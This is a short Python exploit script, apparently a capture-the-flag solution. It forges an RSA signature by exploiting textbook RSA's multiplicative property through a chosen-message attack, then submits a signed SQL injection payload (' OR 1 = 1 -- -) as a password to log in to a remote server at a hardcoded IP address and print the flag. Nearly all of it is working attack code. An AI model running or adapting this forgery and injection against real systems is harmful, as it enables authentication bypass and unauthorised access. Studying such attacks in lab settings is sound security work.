# Import modules
import requests
from Crypto.Util.number import *
import json
from Crypto.PublicKey import RSA    

SIGN_SERVER =  "http://141.85.224.119:5001/sign"
WEB_SERVER = "http://141.85.224.119:5000/login"


def get_signature(hexstring: str):
    data = {"payload" : hexstring}
    response = requests.post(SIGN_SERVER, json=data)
    return json.loads(response.text)["signature"]

public_key = RSA.import_key(open("key.pub","r").read())

'''
*** Chosen message attack ***

signature(m1) = m1^d mod N
signature(m2) = m2^d mod N

m3 = m1 * m2
signature(m3) = m3^d mod N <=> (m1*m2)^ d mod N <=> (m1^d * m2^d) mod N <=> signature(m1) * signature(m2)

=> signature(m3) = signature(m1) * signature(m2) => signature(m2) = signature(m3) * signature(m1)^-1

Obs. All operations are mod N

So with thesse attack we can sign SQL Injection payload without private key

'''

message_1 = b"admin"
message_2 = b"' OR 1 = 1 -- -"

# Compute message_3
message_3 = long_to_bytes(bytes_to_long(message_1) * bytes_to_long(message_2))

# Get signatures of m1 and m3
message_1_signature = get_signature(message_1.hex())
message_3_signature = get_signature(message_3.hex())

# Compute message_2 with signatures of m1 and m3
message_2_signature = hex((inverse(int(message_1_signature, 16), public_key.n) * int(message_3_signature, 16)) % public_key.n)[2:]

# Exploit payload
data = {"username" : message_1, 
        "password" : message_2,
        "username_sign" : message_1_signature,
        "password_sign": message_2_signature}

# Get flag
print(requests.post(WEB_SERVER, json=data).text)